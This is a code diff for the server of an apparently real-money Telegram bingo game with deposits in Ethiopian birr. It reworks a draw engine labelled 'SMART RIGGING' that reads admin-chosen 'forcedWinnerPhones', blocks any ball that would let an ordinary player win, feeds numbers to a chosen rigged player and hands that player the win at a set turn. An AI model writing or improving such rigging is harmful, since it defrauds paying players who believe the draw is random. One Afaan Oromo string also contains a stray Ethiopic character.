@@ -9,11 +9,11 @@ const TelegramBot = require('node-telegram-bot-api');
 const app = express();
 const server = http.createServer(app);
 
-// 🔥 40K Users: Increased payload limit to avoid crash on heavy traffic
+// 🔥 40K Users: Increased payload limit
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// 🔥 40K Users: Socket.io Compression enabled to save bandwidth and prevent lag
+// 🔥 40K Users: Socket.io Compression enabled
 const io = new Server(server, { 
     cors: { origin: "*" },
     perMessageDeflate: { threshold: 1024 } 
@@ -1174,7 +1174,7 @@ app.post('/api/admin/delete-broadcast', auth, async (req, res) => {
 });
 
 // ==========================================
-// 🟢 LIVE BINGO GAME ENGINE (SMART RIGGING)
+// 🟢 LIVE BINGO GAME ENGINE (OPTIMIZED SMART RIGGING)
 // ==========================================
 let gameState = "WAITING";
 let gameClock = 40; 
@@ -1331,13 +1331,11 @@ setInterval(() => {
             if (currentDrawSequence.length === 0) { resetToWaiting(); return; } 
 
             let numToCall = null;
-            let isRiggedRound = false;
-
+            
             let riggedPhones = GLOBAL_SETTINGS.forcedWinnerPhones ? GLOBAL_SETTINGS.forcedWinnerPhones.split(',').map(p => p.trim()).filter(p => p) : [];
             let activeRigged = riggedPhones.filter(p => activePlayers[p]);
 
             if (activeRigged.length > 0) {
-                isRiggedRound = true;
                 
                 if (!midGameChosenRigged || !activeRigged.includes(midGameChosenRigged)) {
                     midGameChosenRigged = activeRigged[Math.floor(Math.random() * activeRigged.length)];
@@ -1345,7 +1343,6 @@ setInterval(() => {
 
                 if (targetWinTurn === 0) {
                     let totalTkts = Object.values(activePlayers).reduce((sum, p) => sum + p.tickets, 0);
-                    
                     if (totalTkts >= 10) {
                         targetWinTurn = Math.floor(Math.random() * (22 - 15 + 1)) + 15;
                     } else {
@@ -1355,8 +1352,10 @@ setInterval(() => {
 
                 let isTimeToWin = (calledNumbers.length + 1) >= targetWinTurn;
 
-                let bestNumberIndex = -1;
-                let bestScore = -Infinity;
+                // Performance-optimized Block Check
+                let safeWinningBalls = []; 
+                let safeFeedingBalls = []; 
+                let otherSafeBalls = [];   
 
                 for (let i = 0; i < currentDrawSequence.length; i++) {
                     let testNum = currentDrawSequence[i];
@@ -1364,43 +1363,44 @@ setInterval(() => {
 
                     let normalWins = false;
                     let riggedWins = false;
-                    let forcedHits = 0;
-                    let normalHits = 0;
+                    let riggedHits = false;
 
+                    // 🔥 Optimization: Check all players for bingo
                     for (let player of Object.values(activePlayers)) {
                         let isRiggedPlayer = (player.phone === midGameChosenRigged);
                         for (let ticket of player.ticketsData) {
-                            let hasNum = ticket.grid.flat().includes(testNum);
                             if (serverCheckBingo(ticket.grid, tempCalled)) {
                                 if (isRiggedPlayer) riggedWins = true;
                                 else normalWins = true;
-                            } else if (hasNum) {
-                                if (isRiggedPlayer) forcedHits++;
-                                else normalHits++;
+                            } else if (isRiggedPlayer && ticket.grid.flat().includes(testNum)) {
+                                riggedHits = true;
                             }
                         }
+                        if (normalWins) break; 
                     }
 
-                    if (normalWins) continue;
-
-                    if (riggedWins && !isTimeToWin) continue;
-
-                    let score = 0;
-
-                    if (isTimeToWin && riggedWins) {
-                        score = 100000;
-                    } else {
-                        score = (forcedHits * 10) + normalHits + Math.random();
-                    }
-
-                    if (score > bestScore) {
-                        bestScore = score;
-                        bestNumberIndex = i;
+                    if (!normalWins) {
+                        if (riggedWins) {
+                            safeWinningBalls.push({ index: i, num: testNum });
+                        } else if (riggedHits) {
+                            // Only "feed" if not everyone is close (Add randomness)
+                            if (Math.random() > 0.3) safeFeedingBalls.push({ index: i, num: testNum });
+                            else otherSafeBalls.push({ index: i, num: testNum });
+                        } else {
+                            otherSafeBalls.push({ index: i, num: testNum });
+                        }
                     }
                 }
 
-                if (bestNumberIndex !== -1) {
-                    numToCall = currentDrawSequence.splice(bestNumberIndex, 1)[0];
+                if (isTimeToWin && safeWinningBalls.length > 0) {
+                    let chosen = safeWinningBalls[Math.floor(Math.random() * safeWinningBalls.length)];
+                    numToCall = currentDrawSequence.splice(chosen.index, 1)[0];
+                } else if (safeFeedingBalls.length > 0) {
+                    let chosen = safeFeedingBalls[Math.floor(Math.random() * safeFeedingBalls.length)];
+                    numToCall = currentDrawSequence.splice(chosen.index, 1)[0];
+                } else if (otherSafeBalls.length > 0) {
+                    let chosen = otherSafeBalls[Math.floor(Math.random() * otherSafeBalls.length)];
+                    numToCall = currentDrawSequence.splice(chosen.index, 1)[0];
                 } else {
                     numToCall = currentDrawSequence.shift();
                 }
@@ -1596,7 +1596,7 @@ const t = {
         balance_text: (u) => `💰 <b>Herrega Kee:</b>\n\n🟢 Tapha: <b>${u.playBalance.toFixed(2)} ETB</b>\n🟡 Muummee: <b>${u.mainBalance.toFixed(2)} ETB</b>`,
         dep_msg: "🏦 <b>Baankii filadhu:</b>", wit_msg: "🏦 <b>Baankii baasuuf filadhu:</b>", invite_msg: (l) => `🔗 <b>Afeeri</b>\n\nLachuun keessan Boonasii argattu!\n\n👇 Liinkii Kee:\n${l}`, guide_msg: `📖 <b>Akkaataa Tapha:</b> Sarara guutu BINGO!`, rules_msg: `📜 <b>Seera:</b> Telebirr gara Telebirr QOFA. CBEBirr gara CBEBirr QOFA.`, choose_lang: "Afaan filadhu:", lang_set: "✅ Jijjiirameera!", warn_telebirr: "⚠️ Telebirr gara Telebirr QOFA!\n\n", warn_cbebirr: "⚠️ CBEBirr gara CBEBirr QOFA!\n\n",
         bank_info: (method, warning, name, num) => `🏦 Baankii: <b>${method}</b>\n\n${warning}Qarshii ergaa:\n👤 Maqaa: <b>${name}</b>\n👉 Lakkoofsa: <b>${num}</b>\n\n<b>Hamma qarshii</b> asitti barreessaa (Fkn: 100):`,
-        wit_info: (method) => `🏦 Baankii: <b>${method}</b>\n\nLakkoofsa barreessaa:`, invalid_amt: (min) => `❌ Yoo xiqqaate ${min} ETB:`, enter_sms: (amt) => `✅ Hamma: <b>${amt} ETB</b>\n\nAmma <b>SMS Baankii</b> asitti ergaa:`, dep_success: "✅ <b>Ergameera!</b>", enter_wit_amt: (acc, min) => `✅ Herrega: <b>${acc}</b>\n\nHamma galchaa (Min ${min}):`, insufficient: "❌ Qarshiin ga'aan hin jiru!", wit_success: (amt, acc) => `✅ <b>Ergameera!</b>`,
+        wit_info: (method) => `🏦 Baankii: <b>${method}</b>\n\nLakkoofsa barreessaa:`, invalid_amt: (min) => `❌ Yoo xiqqaate ${min} ETB:`, enter_sms: (amt) => `✅ Hamma: <b>${amt} ETB</b>\n\nAmma <b>SMS Baankii</b> asitti ergaa:`, dep_success: "✅ <b>Ergameera!</b>", enter_wit_amt: (acc, min) => `✅ Herrega: <b>${acc}</b>\n\nHamma galchaa (Min ${min}):`, insufficient: "❌ Qarshiን ga'aan hin jiru!", wit_success: (amt, acc) => `✅ <b>Ergameera!</b>`,
         play_msg: "BINGO HABESHA irratti taphadhaa, bashannanaa, kumaatama mo'adhaa!\nCarraa Gaarii!"
     },
     ti: {
